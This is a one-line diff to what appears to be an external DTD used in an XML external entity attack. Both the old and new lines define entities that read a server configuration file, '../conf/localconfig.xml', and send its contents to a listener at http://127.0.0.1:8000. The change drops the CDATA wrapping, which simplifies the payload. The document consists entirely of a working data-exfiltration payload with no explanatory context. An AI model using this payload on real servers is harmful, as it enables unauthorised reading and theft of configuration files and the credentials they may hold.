@@ -1,1 +1,1 @@
-<!ENTITY % file SYSTEM "file:../conf/localconfig.xml"><!ENTITY % start "<![CDATA["><!ENTITY % end "]]>"><!ENTITY % all "<!ENTITY fileContents '%start;%file;%end;'>"><!ENTITY % int "<!ENTITY % trick SYSTEM'http://127.0.0.1:8000/?p=%fileContents;'>"> 
+<!ENTITY % file SYSTEM "file:../conf/localconfig.xml"><!ENTITY % int "<!ENTITY % trick SYSTEM'http://127.0.0.1:8000/?p=%file;'>"> 
